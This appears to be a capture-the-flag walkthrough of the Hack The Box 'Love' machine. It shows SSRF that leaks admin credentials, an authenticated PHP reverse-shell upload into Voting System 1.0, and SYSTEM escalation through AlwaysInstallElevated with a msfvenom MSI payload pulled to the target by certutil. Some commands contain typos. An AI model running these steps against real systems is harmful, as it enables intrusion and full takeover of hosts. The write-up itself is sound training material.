# Love
## Reconnaissance
### Initial Port Scan using NmapAutomator.sh
```bash
sudo ./nmapAutomator.sh 
```
* Result

![1_love](https://user-images.githubusercontent.com/53956303/132771652-e1f8f183-fbf2-4910-a25f-39090c1d8635.jpg)
* From the scan for Port 443, a common Name `staging.love.htb` is found
    * Add this host to `/etc/hosts`
```bash
10.10.10.293    staging.love.htb love.htb
```

![2_subdomain](https://user-images.githubusercontent.com/53956303/132771725-8602d431-4a89-49ef-a00f-0fcb36e9bf58.jpg)

## Enumeration
## Port 80 (http://10.10.10.239)
* On the Port 80, Voting System sign in page is found

![15_port80](https://user-images.githubusercontent.com/53956303/132773109-af4b2d04-7401-43cf-b962-81f0b427ecc5.jpg)
### Gobuster on Port 80 (http://10.10.10.239)
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.239 -x sh,php,html,txt
```
* Result

![17_port80](https://user-images.githubusercontent.com/53956303/132773229-8cfee82f-1446-45dd-96d9-fc70890b2321.jpg)

## Port 80 (http://staging.love.htb)
* On the Port 80, Free File Scanner sign up page is found
![3_port80](https://user-images.githubusercontent.com/53956303/132771818-ca83572e-af45-42c2-9caa-ce5a055655f6.jpg)
### Gobuster on Port 80 (http://staging.love.htb)
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://staging.love.htb -x sh,php,html,txt
```
* Result

![16_staging_gobuster](https://user-images.githubusercontent.com/53956303/132773126-51186ade-9737-4f6b-b957-8e544cce5c48.jpg)

### /beta.php
* When click the "Demo" button on the top of the page, it redirects to `beta.php`
    * On the "beta.php", a panel to enter a URL to scan a file is found

![4_demo](https://user-images.githubusercontent.com/53956303/132772025-70344f54-0d30-40a7-bd9a-6423dfa0391f.jpg)
### Try to connect to Kali for enumeration
#### Open a Netcat Listener on Port 80 on Kali
```bash
sudo nc -lnvp 80
```
#### Enter the IP of Kali to connect
* However, from the result, nothing spefical found

![14](https://user-images.githubusercontent.com/53956303/132772298-4c5ec1f5-3576-44e9-8436-dfc3f6e55054.png)
## Port 5000
* Since another Apache http server is found from the NmapAutomator's result, try to enumerate this site using the URL scan function
```bash
http://127.0.0.1:5000
```
* From the result, credentials for "Admin" is found

![5](https://user-images.githubusercontent.com/53956303/132772488-cf752d30-ed86-426a-b983-02d01167f28b.png)
* `admin / @LoveIsInTheAir!!!!`
### Access /admin on Port 80 (http://10.10.10.239/admin)
* Since `/admin` is found from the gobuster result on Port 80, try to log in using the credentials obatiend
    * Using the credentials, access to admin panel of VotingSystem is granted

![7_voting_system](https://user-images.githubusercontent.com/53956303/132773423-bd71e566-1fe9-410e-bade-1ee375e27d71.jpg)
## Exploitation
### Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
* From ExploitDB, an exploit [Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)](https://www.exploit-db.com/exploits/49445) is found
    * From the exploit, INDEX_PAGE, LOGIN_URL, VOTE_URL and CALL_SHELL addresses are found

![18](https://user-images.githubusercontent.com/53956303/132773778-cd1816a3-dc4c-433f-a2f3-42e101ce60f7.png)
### Upload PHP reverse shell exploit on "voters_add.php"
* Upload a Windows PHP reverse shell at the "photo" section when add a new user
```bash
cp ~/Desktop/tools/windows-php-reverse-shell.php pwn.php
```
* Modify LHOST, LPORt and Temporary path

![9_php_shell](https://user-images.githubusercontent.com/53956303/132773941-8d26a21c-74da-4345-a7cd-bad5849db560.jpg)
* Then, upload it as "Photo" section

![8_file_upload](https://user-images.githubusercontent.com/53956303/132773986-b281dd8d-2d42-4812-8fb1-5ee7211ffec5.jpg)
### Initial Foothold
#### Open a Netcat Listener on Kali
```bash
sudo nc -lnvp 443
```
#### Trigger the PHP reverse shell
* Since the CALL_SHELL address is defined on the exploit, use it to trigger the exploit
```bash
curl http://http://10.10.10.239/images/pwn.php
```
* As a result, a reverse shell as `love\phoebe` is open

![12_initial](https://user-images.githubusercontent.com/53956303/132774132-ae7c9041-5ab2-4143-94db-8e6b33e092c0.jpg)

## Privilege Escalation (love\phoebe => nt authority\system)
### Run winPEAS.exe
#### Transfer winPEAS.exe
```bash
# Kali
sudo python3 -m http.server 80

# Target machine
certutil -urlcache -sploit -f http://10.10.14.6/winPEAS.exe winPEAS.exe
```
#### Execute winPEAS.exe
```bash
winPEAS.exe
```
* From the result, `AlwaysInstallElevated` exploit, which always install MSI package using SYSTEM level access, is found

![13_winpea](https://user-images.githubusercontent.com/53956303/132774496-be16c08a-8436-44e5-8f2c-3f2a80e2da60.jpg)
## AlwaysInstallElevated MSI Abuse
* Due to the fact that these settings have been configured, an attacker is able to abuse this and escalate his privileges on the target machine by generating a malicious MSI package that will given him a reverse shell as `nt Authority\System` user
### Make a Payload on Kali
```bash
msfevnom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi > hi.msi
```
#### Transfer it to the target machine
```bash
# kali
sudo python3 -m http.server 80

# Target machine
certutil -urlcache -split -f http://10.10.14.6/hi.msi hi.msi
```
### Getting an Escalated Shell
#### Open a Netcat Listener on Kali
* Open a listener to get the privileged shell
```bash
sudo nc -lnvp 445
```
#### Install the created malicious MSI package on the target machine using `msiexec`
```bash
msiexec /i "C:\Users\Phoebe\Desktop\hi.msi"
```
* As a result, a `nt authority\system` shell is open
